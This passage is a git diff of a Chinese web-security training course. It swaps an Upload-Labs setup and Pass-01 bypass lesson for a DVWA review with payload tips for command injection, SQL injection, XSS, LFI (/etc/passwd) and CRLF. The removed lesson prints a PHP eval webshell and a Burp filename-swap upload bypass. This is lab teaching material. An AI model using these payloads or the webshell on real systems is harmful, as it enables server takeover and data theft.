@@ -1,1553 +1,489 @@
-# Day 19：Upload-Labs搭建与前端绕过Pass1-7
+# Day 19：DVWA 通关毕业典礼 + 后续学习路线总规划 🎓
 
-> **🎯 靶场实战** | 难度：⭐⭐ | 预计学习：60 分钟
-
----
-
-# 第19章 Upload-Labs搭建与前端绕过（Pass1-7）🎯
-
-## 开篇引入：从"入门"到"精通"的必经之路 🚶‍♂️→🏃‍♂️
-
-还记得我们在DVWA里学的文件上传漏洞吗？当时我们打了Low、Medium、High、Impossible四个级别，是不是感觉有点意思？但同时是不是也觉得……不够过瘾？😂
-
-就像你学开车，在驾校的练习场里开了几圈，觉得自己会了，但一上真实的马路就慌了——因为真实路况比练习场复杂多了！
-
-文件上传漏洞也是一样的。真实世界里的文件上传过滤，那可真是五花八门、千奇百怪。有的在前端用JS检查，有的检查MIME类型，有的用黑名单，有的用白名单，有的检查文件头，有的二次渲染……
-
-光靠DVWA那四关，只能算是"入门"，离"精通"还差得远呢！😅
-
-所以今天，我们就要来到一个专门修炼文件上传漏洞的"少林寺"——**Upload-Labs**！
-
-这里有整整 **21关**，每一关都对应一种真实场景下的过滤方式。一关一关打下来，你对文件上传漏洞的理解绝对会有质的飞跃！练完这21关，你就可以自信地说："文件上传？我入门了！"💪
-
-准备好了吗？让我们开始Upload-Labs的闯关之旅吧！🎮
+> **🎯 阶段总结** | 难度：⭐ | 预计学习：45 分钟
 
 ---
 
-## Upload-Labs介绍 📖
+# 第19章 DVWA 通关毕业典礼：从零到准 Web 安全工程师，我们一起走过的路 🎓
 
-### 是什么？专门练文件上传的靶场 🎯
+哈喽各位小伙伴们大家好！👋
 
-**Upload-Labs**是一个专门用来练习文件上传漏洞的靶场，由国内的安全研究者 **c0ny1** 师傅开发。
+恭喜你！🎉🎉🎉 **从今天这一章学完的这一刻起，你正式通关了全球最经典的 Web 入门靶场 DVWA 的全部核心模块！** 从 Day5 到今天 Day19，整整 15 天我们一口气啃下了 16+ 个主流 Web 漏洞，每个漏洞都走过了 Low（原理）→ Medium（绕过）→ High（终极绕过）→ Impossible（正确防御）四个完整阶梯，而且每个关卡都有大白话比喻、SVG 原理图、逐行源码解析、甚至 Python 自动化脚本！
 
-它的特点很鲜明：
-- 🎯 **专注**：就练文件上传这一个漏洞，不搞别的
-- 📚 **全面**：一共21关，涵盖了各种常见的上传绕过场景
-- 🧠 **循序渐进**：从简单到困难，一关一关升级
-- 🔬 **有源码分析**：每一关都能看到源代码，让你知其然更知其所以然
+**零基础小白能走到这里，你已经超过了 80% 想入行但一直停留在"看理论不实操"的人！** 请先给自己鼓个掌！👏👏👏
 
-就像一个健身馆，里面有21台不同的器械，每台器械专门练一块肌肉。等你把21台器械都练一遍，你就成"肌肉男"了！💪
+今天这一章我们不做新漏洞，而是做四件非常重要的事：
 
-### 为什么要练？文件上传真的很危险！😱
+**① 一张表复习 15 天学过的所有漏洞**：Day5~Day18 每章是什么、难度、机试多少分、一句话核心原理，保证你合上书本还能回忆起 80%。
 
-可能有同学会问："为啥非得练文件上传？SQL注入、XSS不也很重要吗？"
+**② 漏洞危害金字塔**：现实世界里（护网、渗透测试、面试）什么漏洞是"高危重灾区"，什么是"低危但常常有"，让你以后学新漏洞知道优先级，不瞎走弯路。
 
-问得好！文件上传漏洞之所以值得我们花这么多时间专门练，是因为它有一个特点：**直接、暴力、危害大！**
+**③ 零基础后续学习路线图**：通关 DVWA 之后下一步该学啥？按顺序给你列"SQLi-Labs → Pikachu 中文靶场 → VulnHub 提权靶机 → CTF 平台 → 面试 & 护网"一条龙，每一步目标明确、周期明确、验收标准明确。
 
-打个比方：
-- SQL注入就像你偷偷配了别人家的保险柜钥匙，能偷里面的钱，但不一定能控制整个房子
-- XSS就像你偷偷在别人家电视上放广告，能影响来看电视的人，但房子本身你控制不了
-- **文件上传漏洞**就不一样了——这相当于你直接配了别人家大门的钥匙，大摇大摆走进去，想干啥干啥！🏠🔑
+**④ 下章 SQLi-Labs 入门预告**：Day20 我们就正式进入 SQLi-Labs Less1-10 啦（也就是原来顺延过来的 day20.md 的内容，完美衔接！），今天先给你打个底、预告一下 Less1-10 的 10 关分别是什么、通关密码是什么。
 
-为什么这么说？因为文件上传漏洞成功了，你就能直接上传一个WebShell，然后拿到服务器的控制权。这是最直接、最有效的getshell方式之一！
-
-所以在真实的渗透测试中，文件上传漏洞是攻击者最喜欢找的漏洞之一，也是防御者必须重点防护的漏洞之一。
-
-### 学习建议：一关一关打，理解原理最重要 🧠
-
-在开始之前，给大家几点学习建议：
-
-1. **不要跳关** ⏭️
-   
-   这21关是循序渐进的，前面的关是后面的基础。建议从Pass-01开始，一关一关往后打，不要直接跳后面的关。就像打游戏，你得先打小怪升级，才能打BOSS对吧？
-
-2. **先自己想，再看答案** 🤔
-   
-   遇到不会的关，先别急着查答案。先自己想一想：这一关可能是怎么过滤的？我可以怎么绕过？多思考，多尝试，实在不行了再看答案。这样印象才深刻。
-
-3. **一定要看源码** 🔬
-   
-   每一关打出来之后，一定要去看看源代码，理解它的过滤原理。知道了"它是怎么防的"，你才能更好地理解"我为什么能绕过去"。死记硬背绕过方法是没用的，理解原理才能举一反三。
-
-4. **多动手实操** 🖐️
-   
-   光看是学不会的，一定要自己动手做。每一关都自己上传试试，抓包改包，感受一下整个过程。
-
-好，废话不多说，我们先把环境搭起来！🛠️
+坐稳扶好，DVWA 毕业典礼正式开始！🎊
 
 ---
 
-## 环境搭建 🏗️
+## 19.1 一张表回顾 Day5~Day18 我们全部学过什么？ 📚
 
-### ⚠️ 特别提醒：别用新版PHPStudy！❌
+<svg width="100%" viewBox="0 0 900 620" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <defs>
+    <linearGradient id="g19tab" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0%" stop-color="#6d28d9"/>
+      <stop offset="100%" stop-color="#06b6d4"/>
+    </linearGradient>
+  </defs>
+  <rect x="0" y="0" width="900" height="620" rx="14" fill="#fafafa" stroke="#e5e7eb" stroke-width="2"/>
+  <rect x="0" y="0" width="900" height="52" rx="14" fill="url(#g19tab)"/>
+  <text x="450" y="35" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="white" font-weight="bold">🎓 DVWA 全模块学习回顾（Day5 ~ Day18，共 14 章 · 16+ 漏洞类型）</text>
+  <!-- 表头 -->
+  <g font-family="Microsoft YaHei" font-size="12" font-weight="bold" fill="#1f2937">
+    <rect x="10" y="62" width="55" height="30" rx="4" fill="#f3f4f6"/>
+    <text x="37" y="81" text-anchor="middle">章节</text>
+    <rect x="65" y="62" width="245" height="30" rx="4" fill="#f3f4f6"/>
+    <text x="187" y="81" text-anchor="middle">模块名（点击 day-*.md 学习）</text>
+    <rect x="310" y="62" width="45" height="30" rx="4" fill="#f3f4f6"/>
+    <text x="332" y="81" text-anchor="middle">难度</text>
+    <rect x="355" y="62" width="65" height="30" rx="4" fill="#f3f4f6"/>
+    <text x="387" y="81" text-anchor="middle">机试分数</text>
+    <rect x="420" y="62" width="470" height="30" rx="4" fill="#f3f4f6"/>
+    <text x="655" y="81" text-anchor="middle">一句话核心原理 / Payload 口诀</text>
+  </g>
+  <!-- 数据行（14 行） -->
+  <g font-family="Microsoft YaHei" font-size="11.5" fill="#111827">
+    <!-- 1 -->
+    <g transform="translate(0,94)">
+      <rect x="10" y="0" width="880" height="36" fill="#eff6ff"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day5</text>
+      <text x="187" y="23" text-anchor="middle">环境搭建 + DVWA 安装 + 暴力破解 Brute Force</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">8 分</text>
+      <text x="655" y="23" text-anchor="middle">Burp Intruder + 弱口令字典；High 级先拿 user_token 再爆破</text>
+    </g>
+    <!-- 2 -->
+    <g transform="translate(0,130)">
+      <rect x="10" y="0" width="880" height="36" fill="#ecfdf5"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day6</text>
+      <text x="187" y="23" text-anchor="middle">命令注入 Command Injection</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">12 分</text>
+      <text x="655" y="23" text-anchor="middle">127.0.0.1 &amp; whoami；绕空格用 ${IFS} / &lt; / {cat,file}</text>
+    </g>
+    <!-- 3 -->
+    <g transform="translate(0,166)">
+      <rect x="10" y="0" width="880" height="36" fill="#eff6ff"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day7</text>
+      <text x="187" y="23" text-anchor="middle">CSRF 跨站请求伪造</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">10 分</text>
+      <text x="655" y="23" text-anchor="middle">POST 用 &lt;form&gt; 自动提交；GET 用 &lt;img src&gt;；High 级 SameSite Lax 必用 Token</text>
+    </g>
+    <!-- 4 -->
+    <g transform="translate(0,202)">
+      <rect x="10" y="0" width="880" height="36" fill="#ecfdf5"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day8</text>
+      <text x="187" y="23" text-anchor="middle">文件上传 File Upload（含图片马）</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">15 分</text>
+      <text x="655" y="23" text-anchor="middle">改 Content-Type；双后缀 .php.jpg；High 级 PHP&lt;5.3.4 用 %00 截断</text>
+    </g>
+    <!-- 5 -->
+    <g transform="translate(0,238)">
+      <rect x="10" y="0" width="880" height="36" fill="#eff6ff"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day9</text>
+      <text x="187" y="23" text-anchor="middle">文件包含 File Inclusion（LFI/RFI）</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">10 分</text>
+      <text x="655" y="23" text-anchor="middle">LFI 用 ../ 穿越读 /etc/passwd；RFI 用 data:// 伪协议执行 PHP</text>
+    </g>
+    <!-- 6 -->
+    <g transform="translate(0,274)">
+      <rect x="10" y="0" width="880" height="36" fill="#ecfdf5"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day10</text>
+      <text x="187" y="23" text-anchor="middle">SQL 注入显注（SQL Injection）</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">15 分</text>
+      <text x="655" y="23" text-anchor="middle">1' UNION SELECT 1,2,3,version()-- ；绕引号用 0x 十六进制 / CHAR()</text>
+    </g>
+    <!-- 7 -->
+    <g transform="translate(0,310)">
+      <rect x="10" y="0" width="880" height="36" fill="#eff6ff"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day11</text>
+      <text x="187" y="23" text-anchor="middle">XSS 跨站脚本（反射+存储+DOM）</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">15 分</text>
+      <text x="655" y="23" text-anchor="middle">反射：&lt;script&gt;alert(1)&lt;/script&gt;；DOM 绕 CSP 用 onerror/onload 事件</text>
+    </g>
+    <!-- 8 -->
+    <g transform="translate(0,346)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day12</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 Insecure CAPTCHA 不安全验证码</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">8 分</text>
+      <text x="655" y="23" text-anchor="middle">两步式改密：Step1 过验证后直接 POST step=2，跳步骤绕过</text>
+    </g>
+    <!-- 9 -->
+    <g transform="translate(0,382)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day13</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 Weak Session IDs 弱会话劫持</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">8 分</text>
+      <text x="655" y="23" text-anchor="middle">抓包连续请求 10 次看 session 规律：自增 / 时间戳 / md5(时间戳)</text>
+    </g>
+    <!-- 10 -->
+    <g transform="translate(0,418)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day14</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 CSP Bypass 内容安全策略绕过</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">6 分</text>
+      <text x="655" y="23" text-anchor="middle">Low 有 'unsafe-inline'；Med 用 CDN 的 JSONP 回调；High nonce 日期 md5 可预测</text>
+    </g>
+    <!-- 11 -->
+    <g transform="translate(0,454)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day15</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 JavaScript Attacks 前端 JS 闯关</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">6 分</text>
+      <text x="655" y="23" text-anchor="middle">success=true 手改；XOR 可逆加密；Python requests 多步 token 流程自动化</text>
+    </g>
+    <!-- 12 -->
+    <g transform="translate(0,490)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day16</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 SQL Injection Blind SQL 盲注</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">10 分</text>
+      <text x="655" y="23" text-anchor="middle">布尔：ASCII(SUB(DATABASE(),1,1))&gt;97；时间：IF(...,SLEEP(3),0)</text>
+    </g>
+    <!-- 13 -->
+    <g transform="translate(0,526)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day17</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 Open HTTP Redirect 开放式重定向</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">5 分</text>
+      <text x="655" y="23" text-anchor="middle">白名单@evil.com（@ 大法）；? 问号 / # 锚点切割 / // 协议相对 URL</text>
+    </g>
+    <!-- 14 -->
+    <g transform="translate(0,562)">
+      <rect x="10" y="0" width="880" height="36" fill="#fef3c7"/>
+      <text x="37" y="23" text-anchor="middle" font-weight="bold">Day18</text>
+      <text x="187" y="23" text-anchor="middle" fill="#92400e">🔓 HTTP Header Injection + 6 彩蛋</text>
+      <text x="332" y="23" text-anchor="middle">⭐⭐⭐</text>
+      <text x="387" y="23" text-anchor="middle">5 分</text>
+      <text x="655" y="23" text-anchor="middle">双写 %0d%0a%0d%0a 绕一次 str_replace；两个 CRLF 跳到 Body 打 XSS</text>
+    </g>
+  </g>
+  <!-- 总计 -->
+  <rect x="10" y="598" width="880" height="16" rx="4" fill="#4c1d95"/>
+  <text x="450" y="610" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="white" font-weight="bold">📊 机试核心漏洞总分合计：≈ 133 分中的 123 分（占比 ≈ 92%） → 学好 Day5~Day18 机试基本稳过！</text>
+</svg>
 
-在搭建之前，有一件非常非常重要的事情要先告诉大家：
-
-**Upload-Labs需要PHP 5.2.17等比较旧的版本，建议直接用作者提供的专用集成环境，不要自己用新版PHPStudy配！**
-
-为啥呢？因为Upload-Labs里有几关是利用老版本PHP的特性的（比如%00截断），如果你用PHP 7.x甚至PHP 8.x，那些关卡根本没法玩！就像你用现代的电脑去玩几十年前的DOS游戏，可能根本运行不起来。
-
-而且，不同的PHP版本、不同的服务器配置，可能会导致某些关过不去，到时候你还以为是自己技术不行，其实是环境的锅。那多冤枉啊！😤
-
-所以最省心的办法就是：**直接用作者提供的专用集成环境**，人家都给你配置好了，解压就能用，啥都不用改。
-
-### 下载地址 📥
-
-Upload-Labs的项目地址在GitHub上：
-
-- 项目主页：https://github.com/c0ny1/upload-labs
-- 专用集成环境：在项目的Release页面里找
-
-💡 **小提示**：如果GitHub访问慢，可以用国内的镜像站，或者找别人分享的网盘资源。
-
-专用集成环境的名字大概叫 `upload-labs-env-win-0.1-beta.1.zip` 之类的，找最新版下载就行。这个集成环境里面已经包含了Apache、PHP 5.2.17、MySQL，还有phpMyAdmin，一站式配齐，非常方便。
-
-另外，你还需要下载最新的21关源码，也在项目主页里下载，或者直接git clone。
-
-### 部署步骤 📋
-
-好，东西都下载好了，我们开始部署。跟着步骤一步步来，很简单的！
-
-#### 步骤1：解压专用集成环境 📦
-
-把下载好的 `upload-labs-env-win-xxx.zip` 解压到一个**英文路径**下。
-
-⚠️ **注意**：路径里不要有中文，不要有空格，不然可能会出问题。比如 `E:\upload-labs-env\` 就挺好，别放到 `E:\我的工具\上传靶场\` 这种路径里。
-
-解压完之后，你会看到里面大概有这些东西：
-- `phpstudy.exe` —— 集成环境的启动程序
-- `WWW` 目录 —— 网站根目录
-- 其他一些配置文件和工具
-
-#### 步骤2：清空WWW目录 🗑️
-
-打开 `WWW` 目录，把里面原有的所有文件都删掉。
-
-为什么要删掉？因为原来里面可能有一些默认的测试文件，我们不需要，而且后面我们要把Upload-Labs的源码放进去。
-
-放心删，删不坏的！😉
-
-#### 步骤3：放入Upload-Labs源码 📂
-
-把你下载的Upload-Labs最新源码解压，然后把解压出来的**所有文件和文件夹**都放到刚才的 `WWW` 目录里。
-
-注意哦，是把源码里面的文件直接放到WWW目录下，不是把整个文件夹放进去。不然你访问的时候还得多一层路径。
-
-放完之后，WWW目录里应该能看到 `index.php`、`upload-labs.php` 这些文件，还有 `Pass-01`、`Pass-02` 这些文件夹。
-
-#### 步骤4：运行modify_path.bat 🔧
-
-回到集成环境的根目录（就是有phpstudy.exe的那个目录），找到一个叫 `modify_path.bat` 的文件，双击运行一下。
-
-这个批处理文件是干嘛的呢？它会自动修改一些配置文件里的路径，因为每个人解压的位置不一样，路径需要改一下。
-
-运行完之后，窗口会自动关闭，那就说明改好了。
-
-#### 步骤5：启动Apache和MySQL 🚀
-
-双击 `phpstudy.exe` 启动集成环境。
-
-启动之后，你应该能在任务栏右下角看到一个小图标。左键点一下，然后把 **Apache** 和 **MySQL** 都启动（点一下那个"启动"按钮，或者是开关之类的）。
-
-等两个都变成绿色的，就说明启动成功了！✅
-
-如果启动失败了怎么办？别慌，大概率是端口被占用了。比如80端口被其他程序占了（比如你之前开了别的PHPStudy），你可以先把别的停掉，或者改一下端口。
-
-#### 步骤6：浏览器访问 🌐
-
-打开你的浏览器，在地址栏输入：
-
-```
-http://localhost/upload-labs/
-```
-
-或者：
-
-```
-http://127.0.0.1/upload-labs/
-```
-
-如果能看到Upload-Labs的主页面，那就说明搭建成功了！🎉
-
-### 验证成功 ✅
-
-成功打开页面后，你应该能看到：
-- 页面顶部有Upload-Labs的标题
-- 左边是一个关卡列表，从Pass-01到Pass-21，一共21关
-- 右边是当前选中关卡的内容，有上传框和提示
-- 每一关下面都有"查看源码"、"查看提示"之类的按钮
-
-如果看到这些，那就恭喜你！环境搭建成功！🎊
-
-### 界面介绍 🖥️
-
-我们来简单认识一下这个界面：
-
-- **左侧关卡列表** 📋：一共21关，点击就能切换关卡。关卡名字一般都暗示了这一关的过滤方式，比如"Pass-01 前端JS验证绕过"，一看就知道这关是前端JS验证。
-- **上传区域** 📤：每一关的核心区域，有文件选择框和上传按钮。
-- **提示按钮** 💡：每一关都有"查看提示"，实在不会了可以看看提示。
-- **源码按钮** 🔬："查看源码"，打完之后一定要看！
-- **上传文件显示区** 🖼️：有的关上传成功后会显示图片预览。
-
-好，环境搭好了。在正式开始闯关之前，我们先快速回顾一下文件上传漏洞的基础知识，热热身子！🔥
+> 💡 **一句话记忆上面这张大表：** **暴力破解开个头，命令注入最上头；CSRF 假手于人，文件上传拿 Webshell；文件包含读源码，SQL 注入扒数据；XSS 偷 Cookie，CAPTCHA 分两步；Weak Session 劫持身份，CSP/Redirect/Header 都是 HTTP 协议层的小坑；SQL 盲注最难点，JS 闯关考细心。** 把这句口诀念 3 遍，面试直接当开场白！🤣
 
 ---
 
-## 文件上传漏洞基础回顾 📚
+## 19.2 漏洞危害金字塔：现实世界里，哪种漏洞最值钱？ 💎
 
-### 什么是文件上传漏洞？🤔
+学完了 DVWA 的 16+ 漏洞，很多同学都会问：**"老师，面试、护网、真实渗透测试，哪种漏洞最好用？我学的时候应该先攻哪个方向？"**
 
-简单回顾一下：
+我用一张**"漏洞危害金字塔（现实世界真实排名）"**图给你排好序了：**塔尖最值钱（拿到直接高危/严重），塔底最常见但价值中等**。未来你学新漏洞、练靶场、投简历，都要按这个金字塔的优先级来分配时间！
 
-> **文件上传漏洞**就是网站有上传文件的功能，但是没有好好检查（或者检查不严）上传的文件类型和内容，导致攻击者可以上传PHP、ASP等脚本文件，进而控制整个服务器。
-
-打个比方：网站就像一个小区，上传功能就像小区的大门。如果保安不检查进来的人，那坏人就可以大摇大摆地进去，为所欲为。
-
-### 一句话木马回顾 🐴
-
-我们的"神器"——一句话木马，还记得吗？
-
-PHP版一句话木马长这样：
-
-```php
-<?php @eval($_POST['shell']); ?>
-```
-
-简单解释一下：
-- `<?php ... ?>` —— PHP代码标记
-- `@` —— 错误抑制符，出错不显示，隐蔽
-- `eval()` —— 把字符串当PHP代码执行（最关键！）
-- `$_POST['shell']` —— 接收POST方式传来的shell参数
-- 密码就是 `shell`（就是那个参数名）
-
-就这么一行代码，威力无穷！上传成功后，用蚁剑连接就能控制服务器了。
-
-### 蚁剑连接回顾 🐜
-
-还记得蚁剑怎么用吗？简单回顾一下步骤：
-
-1. 打开蚁剑
-2. 右键空白处 → "添加数据"
-3. URL地址：填你上传的shell的地址（比如 `http://localhost/upload-labs/upload/shell.php`）
-4. 连接密码：填你一句话木马里的密码（比如 `shell`）
-5. 点"测试连接"，成功了就点"添加"
-6. 双击刚添加的Shell，就能进去管理了
-
-进去之后可以：
-- 📂 浏览文件
-- ⬆️⬇️ 上传下载文件
-- 💻 执行系统命令（虚拟终端）
-- 🗄️ 管理数据库
-- ……还有很多功能
-
-好，基础回顾完毕。接下来，我们正式开始闯关！第一关，走起！🎮
+<svg width="100%" viewBox="0 0 800 560" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <rect x="0" y="0" width="800" height="560" rx="14" fill="#0f172a"/>
+  <text x="400" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="22" fill="#fef9c3" font-weight="bold">💎 漏洞危害金字塔（真实面试 / 护网 / 渗透测试 价值排名）</text>
+  <!-- 金字塔底座：第 5 层低危 -->
+  <polygon points="100,500 700,500 620,440 180,440" fill="#7dd3fc" opacity="0.9"/>
+  <text x="400" y="470" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#0c4a6e" font-weight="bold">第 5 层 · 低危 · 80% 网站有但单漏洞价值不高（3-5 分）</text>
+  <text x="400" y="494" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#0c4a6e">Open Redirect · CSP 配置不当 · 弱 Session · 信息泄露 · 版本号报错</text>
+  <!-- 第 4 层 中危 -->
+  <polygon points="180,440 620,440 540,380 260,380" fill="#a78bfa" opacity="0.95"/>
+  <text x="400" y="410" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#2e1065" font-weight="bold">第 4 层 · 中危 · 可配合其他漏洞组合成高危（5-10 分）</text>
+  <text x="400" y="432" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#2e1065">CSRF · 未授权访问 · Header Injection · DOM XSS · 任意文件下载</text>
+  <!-- 第 3 层 高危 -->
+  <polygon points="260,380 540,380 470,320 330,320" fill="#fbbf24" opacity="0.95"/>
+  <text x="400" y="350" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#78350f" font-weight="bold">第 3 层 · 高危 · 单一漏洞即可拿到权限（10-20 分）</text>
+  <text x="400" y="372" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#78350f">SQL 注入 · 存储型 XSS · 任意文件读取 · 命令注入 · 文件包含</text>
+  <!-- 第 2 层 严重 -->
+  <polygon points="330,320 470,320 420,260 380,260" fill="#f87171" opacity="0.95"/>
+  <text x="400" y="290" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#450a0a" font-weight="bold">第 2 层 · 严重 · 直接 RCE（远程代码执行）可拿服务器</text>
+  <text x="400" y="312" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#450a0a">任意文件上传（可解析 PHP）· 反序列化 · 结构化 RCE（ThinkPHP/Shiro 系列）</text>
+  <!-- 第 1 层 塔尖 核弹级 -->
+  <polygon points="380,260 420,260 400,200" fill="#ef4444" stroke="#fca5a5" stroke-width="2"/>
+  <text x="400" y="235" text-anchor="middle" font-family="Microsoft YaHei" font-size="15" fill="white" font-weight="bold">塔尖 · 核弹级</text>
+  <!-- 右侧说明 -->
+  <g transform="translate(20,150)" font-family="Microsoft YaHei" font-size="12">
+    <rect x="0" y="0" width="300" height="60" rx="8" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
+    <text x="150" y="24" text-anchor="middle" font-weight="bold" fill="#7f1d1d">🔥 塔尖 核弹级（30+ 分）</text>
+    <text x="150" y="44" text-anchor="middle" fill="#7f1d1d">0day / Nday 组合利用 → 直接打穿内网</text>
+  </g>
+  <g transform="translate(480,150)" font-family="Microsoft YaHei" font-size="12">
+    <rect x="0" y="0" width="300" height="60" rx="8" fill="#fef3c7" stroke="#d97706" stroke-width="2"/>
+    <text x="150" y="24" text-anchor="middle" font-weight="bold" fill="#78350f">🎯 面试 / 护网建议主攻</text>
+    <text x="150" y="44" text-anchor="middle" fill="#78350f">第 2、3 层：上传 / SQLi / RCE 三板斧</text>
+  </g>
+  <g transform="translate(250,90)" font-family="Microsoft YaHei" font-size="12">
+    <rect x="0" y="0" width="300" height="40" rx="6" fill="#0ea5e9" opacity="0.2" stroke="#0284c7" stroke-width="1.5"/>
+    <text x="150" y="25" text-anchor="middle" fill="#e0f2fe">💡 DVWA 已覆盖第 3~5 层 + 部分第 2 层</text>
+  </g>
+  <!-- 时间建议 -->
+  <g transform="translate(20,525)" font-family="Microsoft YaHei" font-size="13">
+    <rect x="0" y="0" width="760" height="26" rx="6" fill="#1e293b" stroke="#334155"/>
+    <text x="380" y="18" text-anchor="middle" fill="#cbd5e1">⏱ 零基础时间分配建议：第 2 层 40% · 第 3 层 40% · 第 4 层 15% · 第 5 层 5%（性价比最高）</text>
+  </g>
+</svg>
 
 ---
 
-## Pass-01：前端JS验证绕过 🎯
-
-### 关卡介绍 📋
-
-第一关，名字叫"前端JS验证绕过"。光看名字我们就知道了——这一关的验证是在前端用JavaScript做的。
-
-### 什么是前端验证？🤔
-
-**前端验证**，顾名思义，就是在浏览器端（用户的电脑上）做的验证，一般是用JavaScript写的。
-
-比如你在网站上注册账号，填完邮箱格式不对，立刻就提示你"邮箱格式不正确"，这个一般就是前端JS验证。
-
-前端验证的优点是：**响应快、用户体验好、不占服务器资源**。因为不用把数据发到服务器就能检查。
-
-但是！前端验证有一个致命的缺点：**完全不可信！** 😱
-
-为什么？因为JS代码是在用户的浏览器里运行的，用户可以随便改啊！
-
-打个比方：你去参加考试，老师让你自己改卷子然后报分数。你说你能信这个分数吗？当然不能！谁知道他有没有自己改答案。🤥
-
-前端验证就是这么回事——它只能用来"欺负"普通用户，提升用户体验。对于稍微懂点技术的人来说，前端验证就是个摆设。
-
-### 绕过思路 💡
-
-既然是前端JS验证，那绕过方法可就多了去了。常见的有这几种：
-
-| 方法 | 原理 | 难度 |
-|------|------|------|
-| **禁用JS** | 把浏览器的JavaScript关了，验证代码就不运行了 | ⭐ |
-| **Burp抓包改文件名** | 先传.jpg，抓包改成.php，绕过前端检查 | ⭐⭐ |
-| **改JS代码** | 直接修改网页上的JS验证代码，让它失效 | ⭐⭐ |
-
-这几种方法都可以，我们重点讲第二种——Burp抓包改文件名，因为这个方法最通用，以后很多关都能用得上。
-
-### 详细演示 📝
-
-好，我们来实操一下。
-
-#### 第一步：先直接传shell.php试试？🤔
-
-先试试直接上传我们的一句话木马 `shell.php`，看看会发生什么。
-
-选择文件，点击上传……
-
-是不是弹出一个提示框，说"不允许上传该类型文件！"或者类似的话？文件根本没发出去，在浏览器本地就被拦住了。
-
-这就是前端JS验证在起作用。
-
-#### 第二步：把shell.php改成shell.jpg 🖼️
-
-既然它检查后缀名，那我们把文件后缀改成 `.jpg`，不就行了？
-
-把你的 `shell.php` 重命名为 `shell.jpg`。
-
-等等，那这样传上去的是jpg文件，不是PHP文件啊？那有啥用？
-
-别急，我们还有后招——抓包改回来！😏
-
-#### 第三步：Burp抓包 🕵️
-
-打开Burp Suite，确保代理开着，浏览器也配置好代理了，Intercept is on（拦截开启）。
-
-然后回到浏览器，选择我们的 `shell.jpg`，点击上传。
-
-这时候Burp应该就抓到包了！
-
-#### 第四步：把文件名改回shell.php ✏️
-
-在Burp抓到的请求包里，找到这一行：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
-```
-
-看到了吗？`filename="shell.jpg"`，这就是文件名。
-
-我们把它改回 `shell.php`：
-
-```
-Content-Disposition: form-data; name="upload_file"; filename="shell.php"
-```
-
-就改filename就行，其他地方不用动。Content-Type是什么都没关系，这一关不检查那个。
-
